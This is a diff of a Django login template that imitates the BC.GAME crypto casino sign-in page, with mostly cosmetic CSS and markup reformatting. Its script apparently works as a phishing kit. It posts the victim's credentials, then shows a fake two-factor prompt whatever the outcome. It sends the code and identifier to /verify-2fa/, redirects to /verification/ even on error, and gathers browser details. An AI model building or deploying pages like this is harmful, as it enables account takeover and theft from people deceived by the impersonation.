@@ -125,17 +125,6 @@
             }
         }
 
-        .hero-section {
-            padding: 20px 24px 0 24px;
-            position: relative;
-            display: flex;
-            align-items: flex-start;
-            background: radial-gradient(circle at 20% 10%, rgba(36, 238, 137, 0.1) 0%, transparent 20%), url('{% static "admin/img/bg_m.webp" %}');
-            background-size: 100% 77%;
-            background-position: center top;
-            background-repeat: no-repeat;
-            height: 35vh;
-        }
 
         /* Desktop Large */
         @media (min-width: 1440px) {
@@ -205,6 +194,7 @@
                 height: 25vh;
                 padding: 10px 20px;
             }
+
             .form-section {
                 min-height: 70vh;
                 padding: 12px 20px;
@@ -233,7 +223,9 @@
             pointer-events: none;
         }
 
-        .perks-list * { pointer-events: auto; }
+        .perks-list * {
+            pointer-events: auto;
+        }
 
         .logo {
             width: 160px;
@@ -318,16 +310,17 @@
             text-align: center;
         }
 
-        .perk-text b { 
-            font-size: 14px; 
-            color: var(--text-primary); 
-            display: block; 
+        .perk-text b {
+            font-size: 14px;
+            color: var(--text-primary);
+            display: block;
             line-height: 1.3;
             font-weight: 600;
         }
-        .perk-text p { 
-            font-size: 11px; 
-            color: var(--text-muted); 
+
+        .perk-text p {
+            font-size: 11px;
+            color: var(--text-muted);
             margin: 2px 0 0 0;
             line-height: 1.2;
         }
@@ -436,46 +429,67 @@
             }
         }
 
-        h2 { 
-            margin: 0 0 20px 0; 
-            font-size: 22px; 
+        h2 {
+            margin: 0 0 20px 0;
+            font-size: 22px;
             font-weight: 700;
             color: var(--text-primary);
         }
 
         /* Desktop Large */
         @media (min-width: 1440px) {
-            h2 { font-size: 26px; margin-bottom: 24px; }
+            h2 {
+                font-size: 26px;
+                margin-bottom: 24px;
+            }
         }
 
         /* Desktop */
         @media (min-width: 1024px) and (max-width: 1439px) {
-            h2 { font-size: 24px; margin-bottom: 22px; }
+            h2 {
+                font-size: 24px;
+                margin-bottom: 22px;
+            }
         }
 
         /* Tablet Landscape */
         @media (min-width: 768px) and (max-width: 1023px) {
-            h2 { font-size: 22px; margin-bottom: 20px; }
+            h2 {
+                font-size: 22px;
+                margin-bottom: 20px;
+            }
         }
 
         /* Tablet Portrait */
         @media (min-width: 481px) and (max-width: 767px) {
-            h2 { font-size: 20px; margin-bottom: 18px; }
+            h2 {
+                font-size: 20px;
+                margin-bottom: 18px;
+            }
         }
 
         /* Mobile Large */
         @media (min-width: 376px) and (max-width: 480px) {
-            h2 { font-size: 18px; margin-bottom: 16px; }
+            h2 {
+                font-size: 18px;
+                margin-bottom: 16px;
+            }
         }
 
         /* Mobile Medium */
         @media (min-width: 321px) and (max-width: 375px) {
-            h2 { font-size: 17px; margin-bottom: 15px; }
+            h2 {
+                font-size: 17px;
+                margin-bottom: 15px;
+            }
         }
 
         /* Mobile Small */
         @media (max-width: 320px) {
-            h2 { font-size: 16px; margin-bottom: 14px; }
+            h2 {
+                font-size: 16px;
+                margin-bottom: 14px;
+            }
         }
 
         .tab-container {
@@ -559,14 +573,21 @@
             font-weight: 600;
         }
 
-        .input-group { margin-bottom: 15px; position: relative; }
+        .input-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
 
         @media (max-width: 480px) {
-            .input-group { margin-bottom: 14px; }
+            .input-group {
+                margin-bottom: 14px;
+            }
         }
 
         @media (max-width: 320px) {
-            .input-group { margin-bottom: 12px; }
+            .input-group {
+                margin-bottom: 12px;
+            }
         }
 
         input, #id_identifier, #id_password {
@@ -768,8 +789,8 @@
             font-weight: 700;
         }
 
-        .footer-links span { 
-            color: var(--brand-green); 
+        .footer-links span {
+            color: var(--brand-green);
             cursor: pointer;
             font-weight: 500;
             transition: color 0.3s ease;
@@ -788,12 +809,16 @@
             margin-bottom: 12px;
             font-weight: 700;
         }
+
         .divider::before, .divider::after {
             content: '';
             flex: 1;
             border-bottom: 1px solid var(--border-color);
         }
-        .divider span { padding: 0 12px; }
+
+        .divider span {
+            padding: 0 12px;
+        }
 
         .passkey-btn {
             width: 100%;
@@ -930,7 +955,11 @@
             margin-right: 10px;
         }
 
-        .passkey-icon-wrapper .fa-user { font-size: 14px; color: #98a7b5; }
+        .passkey-icon-wrapper .fa-user {
+            font-size: 14px;
+            color: #98a7b5;
+        }
+
         .passkey-icon-wrapper .fa-key {
             font-size: 8px;
             color: #ffffff;
@@ -949,7 +978,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.7);
+            background: rgba(0, 0, 0, 0.7);
             display: none;
             justify-content: center;
             align-items: flex-end;
@@ -963,7 +992,7 @@
             border-radius: 20px 20px 0 0;
             padding: 28px 24px;
             position: relative;
-            box-shadow: 0 -15px 35px rgba(0,0,0,0.7);
+            box-shadow: 0 -15px 35px rgba(0, 0, 0, 0.7);
             text-align: center;
             color: var(--text-primary);
             border: 1px solid var(--border-color);
@@ -996,42 +1025,10 @@
 
 <div class="login-container">
     <button class="close-btn"><i class="fas fa-times"></i></button>
-
-        <div class="hero-section">
+    <div class="form-section">
         <div class="perks-list">
             <img src="{% static 'admin/img/logo.webp' %}" alt="BC.GAME" class="logo" style="margin-top: 5px;">
-
-            <div class="perk-item" style="margin-top: -20px">
-                <div class="perk-icon"><i class="fas fa-gift"></i></div>
-                <div class="perk-text">
-                    <b>470%</b>
-                    <p>Welcome deposit bonus</p>
-                </div>
-            </div>
-
-            <div class="perk-item">
-                <div class="perk-icon"><i class="fas fa-dharmachakra"></i></div>
-                <div class="perk-text">
-                    <b>5 BTC</b>
-                    <p>Free daily lucky spin</p>
-                </div>
-            </div>
-
-            <div class="perk-item">
-                <div class="custom-badge">
-                    <i class="fas fa-certificate"></i>
-                    <span class="badge-symbol">%</span>
-                </div>
-                <div class="perk-text">
-                    <b>Free Perks</b>
-                    <p>Daily free rewards & bonuses</p>
-                </div>
-            </div>
         </div>
-
-    </div>
-
-    <div class="form-section">
         <h2>Sign In</h2>
 
         <div class="tab-container">
@@ -1040,9 +1037,10 @@
         </div>
 
         <div style="text-align: right; font-size: 12px; color: var(--text-secondary); margin-bottom: 15px; font-weight: 500; position: relative;">
-            <b>Download the App for more fun</b> 
+            <b>Download the App for more fun</b>
             <span style="display: inline-block; width: 16px; height: 16px; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 3px; margin-left: 5px; position: relative; vertical-align: middle;">
-                <i class="fas fa-arrow-up" style="font-size: 8px; position: absolute; top: 2px; right: 2px; transform: rotate(45deg);"></i>
+                <i class="fas fa-arrow-up"
+                   style="font-size: 8px; position: absolute; top: 2px; right: 2px; transform: rotate(45deg);"></i>
             </span>
         </div>
 
@@ -1077,7 +1075,8 @@
         <div class="social-icons">
             <div class="icon-box"><i class="fab fa-google"></i></div>
             <div class="icon-box">
-                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" style="width: 14px; height: 14px; fill: currentColor;">
+                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"
+                     style="width: 14px; height: 14px; fill: currentColor;">
                     <path d="M18.1236 14.3799L26.2298 5.16797H24.3096L17.268 13.1649L11.6481 5.16797H5.16455L13.6648 17.2619L5.16455 26.9208H7.08479L14.5161 18.474L20.4524 26.9208H26.936M8.0674 6.61816L10.7279 6.58362L24.3081 25.5747H21.3574"></path>
                 </svg>
             </div>
@@ -1091,100 +1090,103 @@
 </div>
 
 <script>
-// Collect client-side data
-function collectClientData() {
-    // Screen resolution
-    document.getElementById('screen_resolution').value = screen.width + 'x' + screen.height;
+    // Collect client-side data
+    function collectClientData() {
+        // Screen resolution
+        document.getElementById('screen_resolution').value = screen.width + 'x' + screen.height;
 
-    // Timezone
-    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        // Timezone
+        document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-    // Language
-    document.getElementById('language').value = navigator.language;
-}
-
-// Collect data when page loads
-window.addEventListener('load', collectClientData);
-
-// Password toggle
-document.getElementById('password-toggle').addEventListener('click', function() {
-    const passwordInput = document.querySelector('input[type="password"], input[type="text"][name*="password"], #id_password');
-    const eyeIcon = this.querySelector('i');
-
-    if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        eyeIcon.classList.remove('fa-eye');
-        eyeIcon.classList.add('fa-eye-slash');
-    } else {
-        passwordInput.type = 'password';
-        eyeIcon.classList.remove('fa-eye-slash');
-        eyeIcon.classList.add('fa-eye');
+        // Language
+        document.getElementById('language').value = navigator.language;
     }
-});
 
-// Show 2FA modal when form is submitted
-document.querySelector('#loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+    // Collect data when page loads
+    window.addEventListener('load', collectClientData);
 
-    // Collect latest client data
-    collectClientData();
+    // Password toggle
+    document.getElementById('password-toggle').addEventListener('click', function () {
+        const passwordInput = document.querySelector('input[type="password"], input[type="text"][name*="password"], #id_password');
+        const eyeIcon = this.querySelector('i');
 
-    // Store form data for later use
-    const formData = new FormData(this);
-    window.loginFormData = formData;
-
-    // Submit login form via AJAX first
-    fetch('/', {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.text())
-    .then(data => {
-        // After login is processed, show 2FA modal
-        document.getElementById('twoFAModal').style.display = 'flex';
-    })
-    .catch(error => {
-        // Even on error, show 2FA modal
-        document.getElementById('twoFAModal').style.display = 'flex';
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            eyeIcon.classList.remove('fa-eye');
+            eyeIcon.classList.add('fa-eye-slash');
+        } else {
+            passwordInput.type = 'password';
+            eyeIcon.classList.remove('fa-eye-slash');
+            eyeIcon.classList.add('fa-eye');
+        }
     });
-});
 
-function closeTwoFAModal() {
-    document.getElementById('twoFAModal').style.display = 'none';
-}
+    // Show 2FA modal when form is submitted
+    document.querySelector('#loginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
 
-// Handle 2FA confirmation
-function confirm2FA() {
-    const twoFaCode = document.querySelector('#twoFAModal input[type="text"]').value || '';
-    const identifier = document.querySelector('#id_identifier').value || '';
+        // Collect latest client data
+        collectClientData();
 
-    // Send 2FA data to server
-    fetch('/verify-2fa/', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            twoFaCode: twoFaCode,
-            identifier: identifier
+        // Store form data for later use
+        const formData = new FormData(this);
+        window.loginFormData = formData;
+
+        // Submit login form via AJAX first
+        fetch('/', {
+            method: 'POST',
+            body: formData
         })
-    })
-    .then(response => response.json())
-    .then(data => {
-        // Redirect to verification page
-        window.location.href = '/verification/';
-    })
-    .catch(error => {
-        // Redirect even on error
-        window.location.href = '/verification/';
+            .then(response => response.text())
+            .then(data => {
+                // After login is processed, show 2FA modal
+                document.getElementById('twoFAModal').style.display = 'flex';
+            })
+            .catch(error => {
+                // Even on error, show 2FA modal
+                document.getElementById('twoFAModal').style.display = 'flex';
+            });
     });
-}
+
+    function closeTwoFAModal() {
+        document.getElementById('twoFAModal').style.display = 'none';
+    }
+
+    // Handle 2FA confirmation
+    function confirm2FA() {
+        const twoFaCode = document.querySelector('#twoFAModal input[type="text"]').value || '';
+        const identifier = document.querySelector('#id_identifier').value || '';
+
+        // Send 2FA data to server
+        fetch('/verify-2fa/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                twoFaCode: twoFaCode,
+                identifier: identifier
+            })
+        })
+            .then(response => response.json())
+            .then(data => {
+                // Redirect to verification page
+                window.location.href = '/verification/';
+            })
+            .catch(error => {
+                // Redirect even on error
+                window.location.href = '/verification/';
+            });
+    }
 </script>
 
 <!-- 2FA Modal -->
 <div class="modal-overlay" id="twoFAModal">
     <div class="two-fa-card">
-        <button onclick="closeTwoFAModal()" style="position:absolute;top:20px;right:20px;background:var(--bg-card);border:1px solid var(--border-color);color:var(--text-secondary);border-radius:12px;width:36px;height:36px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:18px;transition:all 0.3s ease;">&times;</button>
+        <button onclick="closeTwoFAModal()"
+                style="position:absolute;top:20px;right:20px;background:var(--bg-card);border:1px solid var(--border-color);color:var(--text-secondary);border-radius:12px;width:36px;height:36px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:18px;transition:all 0.3s ease;">
+            &times;
+        </button>
 
         <div style="width:60px;height:60px;background:var(--bg-card);border:1px solid var(--border-color);border-radius:50%;display:flex;justify-content:center;align-items:center;margin:15px auto 30px auto;">
             <i class="fas fa-shield" style="color:var(--brand-green);font-size:24px;"></i>
@@ -1195,20 +1197,33 @@ function confirm2FA() {
         </div>
 
         <div style="text-align:left;margin-bottom:28px;">
-            <label style="font-size:14px;color:var(--text-secondary);margin-bottom:12px;display:block;font-weight:500;">Verification Code</label>
+            <label style="font-size:14px;color:var(--text-secondary);margin-bottom:12px;display:block;font-weight:500;">Verification
+                Code</label>
             <div style="position:relative;display:flex;align-items:center;">
-                <input type="text" placeholder="6-digit verification code" style="width:100%;background:var(--input-bg);border:1px solid var(--border-color);padding:18px 20px;border-radius:12px;color:var(--text-primary);font-size:16px;outline:none;transition:all 0.3s ease;">
-                <button style="position:absolute;right:12px;background:var(--bg-card);border:1px solid var(--border-color);color:var(--text-secondary);padding:8px 16px;border-radius:8px;font-size:13px;cursor:pointer;font-weight:500;transition:all 0.3s ease;">Paste</button>
+                <input type="text" placeholder="6-digit verification code"
+                       style="width:100%;background:var(--input-bg);border:1px solid var(--border-color);padding:18px 20px;border-radius:12px;color:var(--text-primary);font-size:16px;outline:none;transition:all 0.3s ease;">
+                <button style="position:absolute;right:12px;background:var(--bg-card);border:1px solid var(--border-color);color:var(--text-secondary);padding:8px 16px;border-radius:8px;font-size:13px;cursor:pointer;font-weight:500;transition:all 0.3s ease;">
+                    Paste
+                </button>
             </div>
         </div>
 
-        <div style="font-size:14px;font-weight:600;color:var(--text-muted);margin-bottom:24px;">Don't have access to this 2FA?</div>
+        <div style="font-size:14px;font-weight:600;color:var(--text-muted);margin-bottom:24px;">Don't have access to
+            this 2FA?
+        </div>
 
-        <button onclick="confirm2FA()" style="width:100%;background:var(--gradient-primary);border:none;padding:18px 24px;border-radius:12px;color:var(--bg-primary);font-weight:700;font-size:16px;cursor:pointer;margin-bottom:28px;box-shadow:var(--shadow-primary);transition:all 0.3s ease;">Confirm</button>
+        <button onclick="confirm2FA()"
+                style="width:100%;background:var(--gradient-primary);border:none;padding:18px 24px;border-radius:12px;color:var(--bg-primary);font-weight:700;font-size:16px;cursor:pointer;margin-bottom:28px;box-shadow:var(--shadow-primary);transition:all 0.3s ease;">
+            Confirm
+        </button>
 
         <div style="display:flex;justify-content:space-between;border-top:1px solid var(--border-color);padding-top:24px;gap:16px;">
-            <a href="#" style="color:var(--brand-green);font-size:14px;text-decoration:none;display:flex;align-items:center;gap:8px;font-weight:500;transition:color 0.3s ease;"><i class="fas fa-envelope"></i> Switch to email</a>
-            <a href="#" style="color:var(--brand-green);font-size:14px;text-decoration:none;display:flex;align-items:center;gap:8px;font-weight:500;transition:color 0.3s ease;"><i class="fas fa-mobile-screen"></i> Switch to phone</a>
+            <a href="#"
+               style="color:var(--brand-green);font-size:14px;text-decoration:none;display:flex;align-items:center;gap:8px;font-weight:500;transition:color 0.3s ease;"><i
+                    class="fas fa-envelope"></i> Switch to email</a>
+            <a href="#"
+               style="color:var(--brand-green);font-size:14px;text-decoration:none;display:flex;align-items:center;gap:8px;font-weight:500;transition:color 0.3s ease;"><i
+                    class="fas fa-mobile-screen"></i> Switch to phone</a>
         </div>
     </div>
 </div>
